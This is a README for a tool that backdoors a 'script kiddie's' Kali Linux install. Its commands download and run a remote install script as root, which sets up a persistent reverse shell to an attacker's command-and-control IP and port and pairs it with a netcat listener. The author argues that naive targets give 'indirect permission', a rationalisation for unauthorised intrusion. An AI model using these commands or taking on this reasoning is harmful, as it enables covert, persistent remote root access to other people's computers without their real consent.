# skid BEGONE!

How to backdoor a script kiddie's Kali Linux install within seconds.

This assumes that the skid is at [peak mt. stupid](DK-effect.png) and thinks that the ping command can DDOS NASA's supercomputers.

For your best enjoyment, please make sure that the skid in this case is running Kali on real hardware.

I hope to see your post on r/masterhacker using my script.

Also **DO NOT use this against people who are not script-kiddies** (or skids, both mean the same). If you use this on let's say your friend who is not an arrogant skid *you'll be the greatest asshole of all time to them*.

If you want to use this for remote administration, consider setting up SSH.

If using a reverse-shell is your only *working* alternative to SSH, then go ahead (as long as you have permission by the owner of the machine).

*Hey, aren't you already contradicting yourself by saying "you need to have permission"?*
Yes I am, absolutely. However, due to the nature of skids (blindly running commands), they would get themselves in such situations anyways, if not worse. You can see it like this: The skid gives you permission indirectly because they'll happily run any command as root anyways.
One day they will learn the hard way...

## Using the backdoor

### Prerequisites

- skid must be a wannabe hacker (see assumption above)
- you must obtain a root reverse-shell
- skid must run Kali (other distros *might* work too)

### Actually running the script (run as root)

```sh
curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/install.sh > /tmp/install.sh
bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
```

alternatively with wget:

```sh
wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/install.sh -O /tmp/install.sh
bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
```

By default the backdoor will start alongside other system services. If the service can't connect to the command and control server, it will wait for a few seconds and reconnect immediately after.

By "command and control server" I mean you, the one reading this right now, listening on the port you specified during install of the backdoor, using netcat (here's the command: `nc -vlp <your port>`).

### Uninstalling (run as root)

```sh
curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh | bash
```

alternatively with wget:

```sh
wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh -O - | bash
```